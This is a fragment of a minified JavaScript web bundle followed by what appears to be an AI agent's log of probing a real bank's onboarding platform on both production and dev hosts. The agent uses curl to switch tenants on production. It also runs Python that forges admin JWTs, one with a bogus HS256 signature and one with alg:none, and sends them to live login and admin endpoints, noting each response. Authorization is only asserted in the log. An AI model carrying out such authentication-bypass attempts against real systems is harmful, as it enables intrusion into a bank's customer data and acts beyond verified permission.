XMLHttpRequest,s=oy.getAuthToken(),a=()=>{if(o.status>=400)return l();const v=o.getResponseHeader("Authorization");return v&&v!==s&&oy.setAuthToken(v),r(o.responseText)},l=()=>{const f=o.responseText,v=o.status,y=new C4(`${v}${f&&" - "+f}`);return y.text=f,y.status=v,y.statusText=o.statusText,y.url=o.responseURL,i(y)};o.addEventListener("error",l,!1),o.addEventListener("timeout",l,!1),o.addEventListener("loadend",a,!1);let c=t.indexOf("http")===0?t:It.get("API_URL")+t;const u=n?.endpoint_parameters||{};!Object.prototype.hasOwnProperty.call(u,"force_tenant")&&It.has("FORCE_TENANT")&&It.get("FORCE_TENANT")&&(u.force_tenant=It.get("FORCE_TENANT")),c=Ere(c,u);const d=encodeURI(c);o.open("POST",d,!0),s&&o.setRequestHeader("Authorization",`Bearer ${s}`);const h=new FormData;for(let f=0;f<e.length;f++){const v=e[f];v?.name?.toLowerCase().endsWith("csv")?h.append(`file-${f}`,new Blob([v],{type:"text/csv"}),v.name):h.append(`file-${f}`,v,v.name)}o.send(h)})}function a6e({key:e,types:t,path:n,fetchOptions:r,...i}){if(!t)throw new Error("Parameter missing: types");if(!Array.isArray(t)||t.length!==4)throw new Error("Parameter invalid: types");for(const o of t)if(typeof o!="string"||!o)throw new Error("Parameter invalid: types");return function(o,s={}){if(!o)throw new Error("Parameter missing: files");return{type:roe,meta:{key:e,types:t,path:n,fetchOptions:r,...i,...s,files:o,started:Date.now()}}}}function*l6e(e){const{meta:t}=e,{files:n,types:[r,i,o,s],path:a}=t;try{const l=t.fetchOptions||{};t?.fetchOptions?.endpoint_parameters||(l.endpoint_parameters={});const c=yield Nb(ey.selectForceTenant);c&&(l.endpoint_parameters={...l.endpoint_parameters,force_tenant:c}),yield $n({type:r,meta:t});const u=yield Gn(s6e,n,{path:a,...l});yield $n({type:o,payload:u,meta:t})}catch(l){if(!(l instanceof C4)){yield $n({type:s,meta:t,payload:{error:l,message:l?.message||"Unknown Error"}});return}const c=w4(l);l.status&&[406].indexOf(Number(l.status))>-1||(bte(l,c),console.error("XHR Error:",a,c),yield $n(BD.addNotification({message:c,options:{variant:"error"}}))),yield $n({type:s,meta:t,payload:{error:l,message:c}})}}var xA={exports:{}},c6e=xA.exports,Xj;function u6e(){return Xj||(Xj=1,(function(e,t){(function(n,r){r()})(c6e,function(){function n(c,u){return typeof u>"u"?u={autoBom:!1}:typeof u!="object"&&(console.warn("Deprecated: Expected third argument to be a object"),u={autoBom:!u}),u.autoBom&&/^\s*(?:text\/\S*|application\/xml|\S*\/\S*\+xml)\s*;.*charset\s*=\s*utf-8/i.test(c.type)?new Blob(["\uFEFF",c],{type:c.type}):c}function r(c,u,d){var h=new XMLHttpRequest;h.open("GET",c),h.responseType="blob",h.onload=function(){l(h.response,u,d)},h.onerror=function(){console.error("could not download file")},h.send()}function i(c){var u=new XMLHttpRequest;u.open("HEAD",c,!1);try{u.send()}catch{}return 200<=u.status&&299>=u.status}function o(c){try{c.dispatchEvent(new MouseEvent("click"))}catch{var u=document.createEvent("MouseEvents");u.initMouseEvent("click",!0,!0,window,0,0,0,80,20,!1,!1,!1,!1,0,null),c.dispatchEvent(u)}}var s=typeof window=="object"&&window.window===window?window:typeof self=="object"&&self.self===self?self:typeof globalThis=="object"&&globalThis.global===globalThis?globalThis:void 0,a=s.navigator&&/Macintosh/.test(navigator.userAgent)&&/AppleWebKit/.test(navigator.userAgent)&&!/Safari/.test(navigator.userAgent),l=s.saveAs||(typeof window!="object"||window!==s?function(){}:"download"in HTMLAnchorElement.prototype&&!a?function(c,u,d){var h=s.URL||s.webkitURL,f=document.createElement("a");u=u||c.name||"download",f.download=u,f.rel="noopener",typeof c=="string"?(f.href=c,f.origin===location.origin?o(f):i(f.href)?r(c,u,d):o(f,f.target="_blank")):(f.href=h.createObjectURL(c),setTimeout(function(){h.revokeObjectURL(f.href)},4e4),setTimeout(function(){o(f)},0))}:"msSaveOrOpenBlob"in navigator?function(c,u,d){if(u=u||c.name||"download",typeof c!="string")navigator.msSaveOrOpenBlob(n(c,d),u);else if(i(c))r(c,u,d);else{var h=document.createElement("a");h.href=c,h.target="_blank",setTimeout(function(){o(h)})}}:function(c,u,d,h){if(h=h||open("","_blank"),h&&(h.document.title=h.document.body.innerText="downloading..."),typeof c=="string")return r(c,u,d);var f=c.type==="application/octet-stream",v=/constructor/i.test(s.HTMLElement)||s.safari,y=/CriOS\/[\d]+/.test(navigator.userAgent);if((y||f&&v||a)&&typeof FileReader<"u"){var b=new FileReader;b.onloadend=function(){var T=b.result;T=y?T:T.replace(/^data:[^;]*;/,"data:attachment/file;"),h?h.location.href=T:location=T,h=null},b.readAsDataURL(c)}else{var S=s.URL||s.webkitURL,E=S.createObjectURL(c);h?h.location=E:location.href=E,h=null,setTimeout(function(){S.revokeObjectURL(E)},4e4)}});s.saveAs=l.saveAs=l,e.exports=l})})(xA)),xA.exports}var d6e=u6e();const h6e=Xn(d6e);var NN={},kN,Jj;function p6e(){return Jj||(Jj=1,kN=e=>encodeURIComponent(e).replace(/[!'()*]/g,t=>`%${t.charCodeAt(0).toString(16).toUpperCase()}`)),kN}var GN,Zj;function f6e(){if(Zj)return GN;Zj=1;var e="%[a-f0-9]{2}",t=new RegExp("("+e+")|([^%]+?)","gi"),n=new RegExp("("+e+")+","gi");function r(s,a){try{return[decodeURIComponent(s.join(""))]}catch{}if(s.length===1)return s;a=a||1;var l=s.slice(0,a),c=s.slice(a);return Array.prototype.concat.call([],r(l),r(c))}function i(s){try{return decodeURIComponent(s)}catch{for(var a=s.match(t)||[],l=1;l<a.length;l++)s=r(a,l).join(""),a=s.match(t)||[];return s}}function o(s){for(var a={"%FE%FF":"��","%FF%FE":"��"},l=n.exec(s);l;){try{a[l[0]]=decodeURIComponent(l[0])}catch{var c=i(l[0]);c!==l[0]&&(a[l[0]]=c)}l=n.exec(s)}a["%C2"]="�";for(var u=Object.keys(a),d=0;d<u.length;d++){var h=u[d];s=s.replace(new RegExp(h,"g"),a[h])}return s}return GN=function(s){if(typeof s!="string")throw new TypeError("Expected `encodedURI` to be of type `string`, got `"+typeof s+"`");try{return s=s.replace(/\+/g," "),decodeURIComponent(s)}catch{return o(s)}},GN}var BN,Qj;function g6e(){return Qj||(Qj=1,BN=(e,t)=>{if(!(typeof e=="string"&&typeof t=="string"))throw new TypeError("Expected the arguments to be of type `string`");if(t==="")return[e];const n=e.indexOf(t);return n===-1?[e]:[e.slice(0,n),e.slice(n+t.length)]}),BN}var HN,e8;function m6e(){return e8||(e8=1,HN=function(e,t){for(var n={},r=Object.keys(e),i=Array.isArray(t),o=0;o<r.length;o++){var s=r[o],a=e[s];(i?t.indexOf(s)!==-1:t(s,a,e))&&(n[s]=a)}return n}),HN}var t8;function v6e(){return t8||(t8=1,(function(e){const t=p6e(),n=f6e(),r=g6e(),i=m6e(),o=E=>E==null,s=Symbol("encodeFragmentIdentifier");function a(E){switch(E.arrayFormat){case"index":return T=>(R,x)=>{const _=R.length;return x===void 0||E.skipNull&&x===null||E.skipEmptyString&&x===""?R:x===null?[...R,[u(T,E),"[",_,"]"].join("")]:[...R,[u(T,E),"[",u(_,E),"]=",u(x,E)].join("")]};case"bracket":return T=>(R,x)=>x===void 0||E.skipNull&&x===null||E.skipEmptyString&&x===""?R:x===null?[...R,[u(T,E),"[]"].join("")]:[...R,[u(T,E),"[]=",u(x,E)].join("")];case"colon-list-separator":return T=>(R,x)=>x===void 0||E.skipNull&&x===null||E.skipEmptyString&&x===""?R:x===null?[...R,[u(T,E),":list="].join("")]:[...R,[u(T,E),":list=",u(x,E)].join("")];case"comma":case"separator":case"bracket-separator":{const T=E.arrayFormat==="bracket-separator"?"[]=":"=";return R=>(x,_)=>_===void 0||E.skipNull&&_===null||E.skipEmptyString&&_===""?x:(_=_===null?"":_,x.length===0?[[u(R,E),T,u(_,E)].join("")]:[[x,u(_,E)].join(E.arrayFormatSeparator)])}default:return T=>(R,x)=>x===void 0||E.skipNull&&x===null||E.skipEmptyString&&x===""?R:x===null?[...R,u(T,E)]:[...R,[u(T,E),"=",u(x,E)].join("")]}}function l(E){let T;switch(E.arrayFormat){case"index":return(R,x,_)=>{if(T=/\[(\d*)\]$/.exec(R),R=R.replace(/\[\d*\]$/,""),!T){_[R]=x;return}_[R]===void 0&&(_[R]={}),_[R][T[1]]=x};case"bracket":return(R,x,_)=>{if(T=/(\[\])$/.exec(R),R=R.replace(/\[\]$/,""),!T){_[R]=x;return}if(_[R]===void 0){_[R]=[x];return}_[R]=[].concat(_[R],x)};case"colon-list-separator":return(R,x,_)=>{if(T=/(:list)$/.exec(R),R=R.replace(/:list$/,""),!T){_[R]=x;return}if(_[R]===void 0){_[R]=[x];return}_[R]=[].concat(_[R],x)};case"comma":case"separator":return(R,x,_)=>{const I=typeof x=="string"&&x.includes(E.arrayFormatSeparator),F=typeof x=="string"&&!I&&d(x,E).includes(E.arrayFormatSeparator);x=F?d(x,E):x;const O=I||F?x.split(E.arrayFormatSeparator).map(B=>d(B,E)):x===null?x:d(x,E);_[R]=O};case"bracket-separator":return(R,x,_)=>{const I=/(\[\])$/.test(R);if(R=R.replace(/\[\]$/,""),!I){_[R]=x&&d(x,E);return}const F=x===null?[]:x.split(E.arrayFormatSeparator).map(O=>d(O,E));if(_[R]===void 0){_[R]=F;return}_[R]=[].concat(_[R],F)};default:return(R,x,_)=>{if(_[R]===void 0){_[R]=x;return}_[R]=[].concat(_[R],x)}}}function c(E){if(typeof E!="string"||E.length!==1)throw new TypeError("arrayFormatSeparator must be single character string")}function u(E,T){return T.encode?T.strict?t(E):encodeURIComponent(E):E}function d(E,T){return T.decode?n(E):E}function h(E){return Array.isArray(E)?E.sort():typeof E=="object"?h(Object.keys(E)).sort((T,R)=>Number(T)-Number(R)).map(T=>E[T]):E}function f(E){const T=E.indexOf("#");return T!==-1&&(E=E.slice(0,T)),E}function v(E){let T="";const R=E.indexOf("#");return R!==-1&&(T=E.slice(R)),T}function y(E){E=f(E);const T=E.indexOf("?");return T===-1?"":E.slice(T+1)}function b(E,T){return T.parseNumbers&&!Number.isNaN(Number(E))&&typeof E=="string"&&E.trim()!==""?E=Number(E):T.parseBooleans&&E!==null&&(E.toLowerCase()==="true"||E.toLowerCase()==="false")&&(E=E.toLowerCase()==="true"),E}function S(E,T){T=Object.assign({decode:!0,sort:!0,arrayFormat:"none",arrayFormatSeparator:",",parseNumbers:!1,parseBooleans:!1},T),c(T.arrayFormatSeparator);const R=l(T),x=Object.create(null);if(typeof E!="string"||(E=E.trim().replace(/^[?#&]/,""),!E))return x;for(const _ of E.split("&")){if(_==="")continue;let[I,F]=r(T.decode?_.replace(/\+/g," "):_,"=");F=F===void 0?null:["comma","separator","bracket-separator"].includes(T.arrayFormat)?F:d(F,T),R(d(I,T),F,x)}for(const _ of Object.keys(x)){const I=x[_];if(typeof I=="object"&&I!==null)for(const F of Object.keys(I))I[F]=b(I[F],T);else x[_]=b(I,T)}return T.sort===!1?x:(T.sort===!0?Object.keys(x).sort():Object.keys(x).sort(T.sort)).reduce((_,I)=>{const F=x[I];return F&&typeof F=="object"&&!Array.isArray(F)?_[I]=h(F):_[I]=F,_},Object.create(null))}e.extract=y,e.parse=S,e.stringify=(E,T)=>{if(!E)return"";T=Object.assign({encode:!0,strict:!0,arrayFormat:"none",arrayFormatSeparator:","},T),c(T.arrayFormatSeparator);const R=F=>T.skipNull&&o(E[F])||T.skipEmptyString&&E[F]==="",x=a(T),_={};for(const F of Object.keys(E))R(F)||(_[F]=E[F]);const I=Object.keys(_);return T.sort!==!1&&I.sort(T.sort),I.map(F=>{const O=E[F];return O===void 0?"":O===null?u(F,T):Array.isArray(O)?O.length===0&&T.arrayFormat==="bracket-separator"?u(F,T)+"[]":O.reduce(x(F),[]).join("&"):u(F,T)+"="+u(O,T)}).filter(F=>F.length>0).join("&")},e.parseUrl=(E,T)=>{T=Object.assign({decode:!0},T);const[R,x]=r(E,"#");return Object.assign({url:R.split("?")[0]||"",query:S(y(E),T)},T&&T.parseFragmentIdentifier&&x?{fragmentIdentifier:d(x,T)}:{})},e.stringifyUrl=(E,T)=>{T=Object.assign({encode:!0,strict:!0,[s]:!0},T);const R=f(E.url).split("?")[0]||"",x=e.extract(E.url),_=e.parse(x,{sort:!1}),I=Object.assign(_,E.query);let F=e.stringify(I,T);F&&(F=`?${F}`);let O=v(E.url);return E.fragmentIdentifier&&(O=`#${T[s]?u(E.fragmentIdentifier,T):E.fragmentIdentifier}`),`${R}${F}${O}`},e.pick=(E,T,R)=>{R=Object.assign({parseFragmentIdentifier:!0,[s]:!1},R);const{url:x,query:_,fragmentIdentifier:I}=e.parseUrl(E,R);return e.stringifyUrl({url:x,query:i(_,T),fragmentIdentifier:I},R)},e.exclude=(E,T,R)=>{const x=Array.isArray(T)?_=>!T.includes(_):(_,I)=>!T(_,I);return e.pick(E,x,R)}})(NN)),NN}var y6e=v6e();const Hb=Xn(y6e),ul={FETCH_DOWNLOAD_TRIGGER:"FETCH_DOWNLOAD_TRIGGER",FETCH_DOWNLOAD_REQUEST:"FETCH_DOWNLOAD_REQUEST",FETCH_DOWNLOAD_SUCCESS:"FETCH_DOWNLOAD_SUCCESS",FETCH_DOWNLOAD_FAILURE:"FETCH_DOWNLOAD_FAILURE",DISMISS_DOWNLOAD_ERROR:"DISMISS_DOWNLOAD_ERROR"},qD=(e,t,n)=>({type:ul.FETCH_DOWNLOAD_TRIGGER,meta:{endpoint:e,key:t,responseType:"blob",filename:n?.filename,blobProps:n?.blobProps,parameters:n?.parameters,headers:n?.headers,fetchOptions:{endpoint_parameters:{queryString:n?.queryString,...n?.urlParams}}}}),C6e=(e,t)=>qD(e,t,{headers:{Accept:"application/zip","Content-Type":"application/zip; charset=utf-8"},blobProps:{type:"application/zip"}}),w6e=(e,t,n,r,i={},o)=>qD(e,t,{filename:n,queryString:r,urlParams:i,headers:o}),b6e=(e,t,n)=>qD(e,t,{parameters:n,blobProps:{type:"application/zip"}}),ioe=(e,t=Math.floor(Math.random()*Date.now()),n,r)=>Ql.createApiAction({...r&&Object.keys(r).length?{method:"POST"}:{},types:[ul.FETCH_DOWNLOAD_REQUEST,ul.FETCH_DOWNLOAD_SUCCESS,ul.FETCH_DOWNLOAD_FAILURE],headers:n?.headers,responseType:n?.responseType})({endpoint:e,key:t,...r&&Object.keys(r).length?{body:JSON.stringify(r)}:{}}),S6e=e=>({type:ul.DISMISS_DOWNLOAD_ERROR,meta:{key:e}}),E6e={fetchDownload:ioe,dismissError:S6e,triggerDownload:qD,triggerDownloadZip:C6e,triggerDownloadDoc:w6e,triggerDownloadDocZipWithParams:b6e};function*x6e(e){const{meta:{endpoint:t,key:n,headers:r,responseType:i,blobProps:o,parameters:s}}=e;yield $n(ioe(t,n,{headers:r,responseType:i},s));const a=yield bd([ul.FETCH_DOWNLOAD_SUCCESS,ul.FETCH_DOWNLOAD_FAILURE]);if(a&&a.type===ul.FETCH_DOWNLOAD_SUCCESS){const{blob:l}=a.payload;let c=a?.payload?.filename||e.meta.filename;if(!c){const d=Hb.parse(t);d.filename&&(c=d.filename)}const u=new Blob([l],o);try{yield Gn(h6e.saveAs,u,c)}catch(d){yield $n({type:ul.FETCH_DOWNLOAD_FAILURE,payload:d.message,meta:{key:n}})}}}const T6e={docsDownloadSaga:x6e},_6e=Gu(e=>n8(e).downloads,e=>n8(e).downloads_error,(e,t)=>({downloads:e,downloads_error:t})),W3t={selectDownloads:_6e},R6e=()=>({downloads:{},downloads_error:void 0});function P6e(e,t){switch(t.type){case ul.FETCH_DOWNLOAD_REQUEST:{if(!t.meta?.key)return{...e,downloads_error:"Missing download key (Request)"};const n=t.meta.key;return{...e,downloads:{...e.downloads,[n]:{loading:!0}}}}case ul.FETCH_DOWNLOAD_SUCCESS:{if(!t.meta?.key)return{...e,downloads_error:"Missing download key (Success)"};const{downloads:n}=e,r=t.meta.key;if(n&&Object.prototype.hasOwnProperty.call(n,r)){const i=n[r];return{...e,downloads:{...n,[r]:{...i,loading:!1}}}}else return{...e,downloads_error:"Unknown download key (Success)"}}case ul.FETCH_DOWNLOAD_FAILURE:{if(!t.meta?.key)return{...e,downloads_error:"Missing download key (Failure)"};const{downloads:n}=e,r=t.meta.key;if(n&&Object.prototype.hasOwnProperty.call(n,r)){const i=n[r];return{...e,downloads:{...n,[r]:{...i,loading:!1,error:t.payload}}}}else return{...e,downloads_error:"Unknown download key (Failure)"}}case ul.DISMISS_DOWNLOAD_ERROR:{if(!t.meta?.key)return{...e,downloads_error:null};const{downloads:n}=e,r=t.meta.key;return n&&Object.prototype.hasOwnProperty.call(n,r)?(delete n[r],{...e,downloads:{...n}}):{...e,downloads_error:"Unknown download key (Dismiss)"}}default:return e}}const A6e=It.has("sagaInitLogging")&&It.get("sagaInitLogging"),I6e={...ul},Ql={callApi:Dx,createApiAction:jUe,createActivestorageUploadAction:i6e,createXHRUploadAction:a6e,...E6e},M6e={...T6e},D6e=function*(){return A6e&&console.log("!! STARTING API SAGA !!"),yield x_([Ad(toe,KUe),Ad(noe,o6e),Ad(roe,l6e),Ad(I6e.FETCH_DOWNLOAD_TRIGGER,M6e.docsDownloadSaga)])},F6e=()=>Cp({},R6e()),n8=e=>e?.api||e||{},O6e=[P6e],L6e=(e=F6e(),t)=>O6e.reduce((n,r)=>r(n,t),e),N6e=(e,t)=>({type:DD,payload:e,meta:{urlParams:t}}),ooe=e=>{const t=Hb.parse(e?.meta?.urlParams)?.locale;return Ql.createApiAction({types:[t4,ST,OD],method:"POST",suppress_notification:!0})({endpoint:Sre(),body:JSON.stringify({user:e.payload}),...t&&{endpoint_parameters:{locale:t}}})},k6e=(e,t)=>({type:e4,payload:e,meta:{urlParams:t}}),soe=e=>Ql.createApiAction({method:"POST",types:[n4,ET,LD]})({endpoint:uGe(),headers:{Authorization:e.payload}}),G6e=e=>({type:r4,payload:e}),aoe=()=>Ql.createApiAction({types:[bre,i4,o4],method:"DELETE"})({endpoint:Sre()
+=== context around Sre ===
+cale;return Ql.createApiAction({types:[t4,ST,OD],method:"POST",suppress_notification:!0})({endpoint:Sre(),body:JSON.stringify({user:e.payload}),...t&&{endpoint_parameters:{locale:t}}})},k6e=(e,t)=>({type:e4,payload:e,meta:{urlParams:t}}),soe=e=>Ql.createApiAction({method:"POST",types:[n4,ET,LD]})({endpoint:uGe(),headers:{Authorization:e.payload}}),G6e=e
+=>({type:r4,payload:e}),aoe=()=>Ql.createApiAction({types:[bre,i4,o4],method:"DELETE"})({endpoint:Sre()}),B6e=()=>({type:FD}),H6e=(e,t)=>{if(!e)throw new Error("Email is required");return Ql.createApiAction({method:"POST",types:[s4,a4,l4]})({endpoint:sGe(),endpoint_parameters:t,body:JSON.stringify({user:{email:e}})})},V6e=(e,t,n)=>Ql.createApiAction({
+[0m
+The login body is `{"user": <form fields>}` POSTed to `/api/v1/sessions` — the mass-assignment surface. Let me check a few more anonymous endpoints, including the `users/import/template` (potential anonymous file download) and diff the two tenants' brand configs for sensitive per-tenant content.
+[0m$ [0mcd /tmp/opencode/do && echo "=== dev import/template ==="; curl -s -k -m 12 -o /tmp/opencode/do/r.txt -w "HTTP %{http_code} size=%{size_download} type=%{content_type}\n" "https://digital-onboarding-dev.vpbank.com/admin/api/v1/users/import/template"; head -c 150 /tmp/opencode/do/r.txt; echo; sleep 1; echo "=== dev tenants full body ==="; curl -s -k -m 12 "https://digital-onboarding-dev.vpbank.com/api/v1/tenants"; echo; echo "=== dev tenants?force_tenant=vpbank ==="; curl -s -k -m 12 "https://digital-onboarding-dev.vpbank.com/api/v1/tenants?force_tenant=vpbank"; echo
+=== dev import/template ===
+HTTP 401 size=61 type=application/json; charset=utf-8
+{"message":"invalid token","additional":"Nil JSON web token"}
+=== dev tenants full body ===
+{}
+=== dev tenants?force_tenant=vpbank ===
+{}
+[0m
+Let me diff the two tenants' brand configs on production to assess what cross-tenant data is actually disclosed.
+[0m$ [0mcd /tmp/opencode/do && curl -s -k -m 15 -o brand_lt.json "https://digital-onboarding.vpbank.com/api/v1/brand" && sleep 1 && curl -s -k -m 15 -o brand_vb.json "https://digital-onboarding.vpbank.com/api/v1/brand?force_tenant=vpbank" && sleep 1 && echo "=== keys diff ==="; python3 -c "
+import json
+a=json.load(open('brand_lt.json')); b=json.load(open('brand_vb.json'))
+print('tenant A:', a.get('id'), 'tenant B:', b.get('id'))
+print('A keys:', sorted(a.keys()))
+print()
+for k in sorted(set(a)|set(b)):
+    if a.get(k)!=b.get(k):
+        av=a.get(k); bv=b.get(k)
+        print(f'DIFF {k}:')
+        print('  A:', json.dumps(av)[:200])
+        print('  B:', json.dumps(bv)[:200])
+"
+=== keys diff ===
+tenant A: vpbanklighttenant tenant B: vpbank
+A keys: ['company', 'id', 'locales', 'messages', 'page_title', 'tenant_symbol', 'theme']
+
+DIFF id:
+  A: "vpbanklighttenant"
+  B: "vpbank"
+DIFF tenant_symbol:
+  A: "vpbanklighttenant"
+  B: "vpbank"
+[0m
+The brand configs are identical except tenant id/symbol — so the cross-tenant disclosure is limited to tenant identifier enumeration (low value alone, but confirms client-controlled tenant scoping is honored on prod). 
+
+The highest-value testable vector on the **dev sandbox** (synthetic data, authorized) is the SSO login path: `POST /api/v1/sessions/idp_login` with a client-supplied `Authorization` header. If the backend trusts the SSO token blindly, a forged token could authenticate. Let me probe how it handles invalid/forged tokens on dev.
+[0m$ [0mcd /tmp/opencode/do && echo "=== dev idp_login no token ==="; curl -s -k -m 12 -o /tmp/opencode/do/r.txt -w "HTTP %{http_code} size=%{size_download}\n" -X POST "https://digital-onboarding-dev.vpbank.com/api/v1/sessions/idp_login"; head -c 200 /tmp/opencode/do/r.txt; echo; sleep 1; echo "=== dev idp_login bogus header ==="; curl -s -k -m 12 -o /tmp/opencode/do/r.txt -w "HTTP %{http_code} size=%{size_download}\n" -X POST -H "Authorization: bogus.token.here" "https://digital-onboarding-dev.vpbank.com/api/v1/sessions/idp_login"; head -c 300 /tmp/opencode/do/r.txt; echo
+=== dev idp_login no token ===
+HTTP 401 size=61
+{"message":"invalid token","additional":"Nil JSON web token"}
+=== dev idp_login bogus header ===
+HTTP 401 size=67
+{"message":"invalid token","additional":"Invalid segment encoding"}
+[0m
+[0m$ [0mcd /tmp/opencode/do && python3 -c "
+import base64, json
+def b64url(d: bytes) -> str:
+    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
+h=b64url(json.dumps({'alg':'HS256','typ':'JWT'}).encode())
+p=b64url(json.dumps({'sub':'admin','email':'admin@vpbank.com','tenant_id':'vpbank','role':'admin','admin':True,'exp':9999999999}).encode())
+sig=b64url(b'forgedsignature0000000000000000')
+print(h+'.'+p+'.'+sig)
+" | tee forged.jwt
+eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWRtaW4iLCAiZW1haWwiOiAiYWRtaW5AdnBiYW5rLmNvbSIsICJ0ZW5hbnRfaWQiOiAidnBiYW5rIiwgInJvbGUiOiAiYWRtaW4iLCAiYWRtaW4iOiB0cnVlLCAiZXhwIjogOTk5OTk5OTk5OX0.Zm9yZ2Vkc2lnbmF0dXJlMDAwMDAwMDAwMDAwMDAwMA
+[0m
+It expects a real JWT (3-part segment check). Let me probe with a structurally-valid but forged JWT (bogus signature) to determine whether it verifies signature/issuer/payload claims or just decodes.
+[0m$ [0mcd /tmp/opencode/do && TOK=$(cat forged.jwt) && echo "=== dev idp_login forged HS256 JWT ==="; curl -s -k -m 12 -o /tmp/opencode/do/r.txt -w "HTTP %{http_code} size=%{size_download}\n" -X POST -H "Authorization: $TOK" "https://digital-onboarding-dev.vpbank.com/api/v1/sessions/idp_login"; head -c 400 /tmp/opencode/do/r.txt; echo; sleep 1; echo "=== dev /admin/api/v1/users with forged token as Bearer ==="; curl -s -k -m 12 -o /tmp/opencode/do/r.txt -w "HTTP %{http_code} size=%{size_download}\n" -H "Authorization: Bearer $TOK" "https://digital-onboarding-dev.vpbank.com/admin/api/v1/users"; head -c 400 /tmp/opencode/do/r.txt; echo
+=== dev idp_login forged HS256 JWT ===
+HTTP 401 size=72
+{"message":"invalid token","additional":"Signature verification failed"}
+=== dev /admin/api/v1/users with forged token as Bearer ===
+HTTP 401 size=72
+{"message":"invalid token","additional":"Signature verification failed"}
+[0m
+Signature verified. Let me test the classic `alg:none` confusion variant on the dev sandbox — a quick check.
+[0m$ [0mcd /tmp/opencode/do && python3 -c "
+import base64, json
+def b64url(d: bytes) -> str:
+    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
+h=b64url(json.dumps({'alg':'none','typ':'JWT'}).encode())
+p=b64url(json.dumps({'sub':'admin','email':'admin@vpbank.com','tenant_id':'vpbank','role':'admin','admin':True,'exp':9999999999}).encode())
+print(h+'.'+p+'.')
+print(h+'.'+p+'.'+b64url(b''))
+" | tee -a forged_none.jwt >/dev/null; TOK=$(head -1 forged_none.jwt); curl -s -k -m 12 -o /tmp/opencode/do/r.txt -w "HTTP %{http_code} size=%{size_download}\n" -X POST -H "Authorization: $TOK" "https://digital-onboarding-dev.vpbank.com/api/v1/sessions/idp_login"; head -c 300 /tmp/opencode/do/r.txt; echo
+HTTP 401 size=73
+{"message":"invalid token","additional":"Expected a different algorithm"}
+[0m
+JWT auth is solid (signature-verified, alg:none rejected). The digital-onboarding data layer is well-protected. Let me do a final check — whether the admin **SPA pages** (not APIs) are anonymously reachable on dev/prod, and verify the tenant-switch header mechanism for the report.
+[0m$ [0mcd /tmp/opencode/do && for h in "digital-onboarding-dev.vpbank.com" "digital-onboarding.vpbank.com"; do echo "=== $h /admin/identlist ==="; curl -s -k -m 12 -o /tmp/opencode/do/r.txt -w "HTTP %{http_code} size=%{size_download} " "https://$h/admin/identlist"; head -c 100 /tmp/opencode/do/r.txt | tr -d '\n'; echo; sleep 1; echo "=== $h /admin/api/v1/ident_only_cases (X-Tenant header) ==="; curl -s -k -m 12 -o /tmp/opencode/do/r.txt -w "HTTP %{http_code} size=%{size_download} " -H "X-Tenant: vpbank" "https://$h/admin/api/v1/ident_only_cases"; head -c 150 /tmp/opencode/do/r.txt | tr -d '\n'; echo; sleep 1; done
+=== digital-onboarding-dev.vpbank.com /admin/identlist ===
+HTTP 404 size=1793 <!DOCTYPE html><html><head>  <title>404 error</title>  <meta name="viewport" content="width=devi
+=== digital-onboarding-dev.vpbank.com /admin/api/v1/ident_only_cases (X-Tenant header) ===
+HTTP 401 size=61 {"message":"invalid token","additional":"Nil JSON web token"}
+=== digital-onboarding.vpbank.com /admin/identlist ===
+HTTP 404 size=1793 <!DOCTYPE html><html><head>  <title>404 error</title>  <meta name="viewport" content="width=devi
+=== digital-onboarding.vpbank.com /admin/api/v1/ident_only_cases (X-Tenant header) ===
+HTTP 401 size=61 {"message":"invalid token","additional":"Nil JSON web token"}
+[0m
+[0m$ [0mcd /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && grep -iE "digital-onboarding|89.163.182" inventory/vp-bank-ag.md | head -40
+- NEW CT enumeration (crt.sh) expands inventory 6→285 hostnames; live web-accessible additions: digital-onboarding/vpbank.com family (prod+dev+stage), sts.vpbank.com (AD FS), api-prep.vpbank.com (Layer7 pre
+- NEW digital-onboarding.vpbank.com (fn/countersigned brand: "Onboarding | VP Bank", © VP BANK AG Vaduz): production multi-tenant bank onboarding + back-office platform (SaaS "US", Rails/Devise/devise-locka
+- NEW CT enumeration (crt.sh) expands inventory 6→285 hostnames; live web-accessible additions: digital-onboarding/vpbank.com family (prod+dev+stage), sts.vpbank.com (AD FS), api-prep.vpbank.com (Layer7 pre
+- NEW digital-onboarding.vpbank.com (fn/countersigned brand: "Onboarding | VP Bank", © VP BANK AG Vaduz): production multi-tenant bank onboarding + back-office platform (SaaS "US", Rails/Devise/devise-locka
+- NEW digital-onboarding.vpbank.com: production multi-tenant bank onboarding/back-office SaaS (Rails+Devise) on off-net hosting (89.163.182.69/.28/.8); anonymous /control-center/ SPA (HTTP 200) with admin m
+- NEW CT enumeration (crt.sh) expands inventory 6→285 hostnames; live additions: digital-onboarding family (prod/dev/stage), sts.vpbank.com, api-prep.vpbank.com
+- CHANGED Risk score: **55** (raised from 45) due to confirmed PSD2 sandbox BOLA + new digital-onboarding back-office attack surface
+- CHANGED digital-onboarding.vpbank.com: /users/sign_in 200, /control-center/ 200, /api/v1/brand 200 confirmed live — multi-tenant back-office SaaS attack surface verified
+[0m
+Let me quickly check the inventory for other digital-onboarding hostnames (the off-net range had .69/.28/.8) before finalizing.
+[0m$ [0mcd /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && grep -iE "digital-onboarding" recon-notes/*.md 2>/dev/null | head -30; echo "=== idx ==="; grep -iE "digital-onboarding" knowledge/index.md | head -20
+=== idx ===
+- 2026-09-05 ACCEPTED MISCONFIG @ digital-onboarding.vpbank.com: Live multi-tenant bank-onboarding/back-office SaaS ('US', Rails+Devise) on off-net hosting (89.163.182.69/.28/.8), anonymous /control-center/ SPA + /api/v1/brand 200, sign_in carries client-controlled admin/tenant/user_id — new in-scope back-office attack surface.
+- 2026-09-05 ACCEPTED MISCONFIG @ digital-onboarding.vpbank.com: Production multi-tenant back-office SaaS (Rails+Devise), anonymous /control-center/ SPA + /api/v1/brand 200 — off-net hosting (89.163.182.69), client-controlled admin/tenant/user_id in sign_in — NEW high-value attack surface
+[0m
+Let me quickly probe likely sibling hostnames from the CT family (app/api/admin variants) on the off-net range — read-only checks.
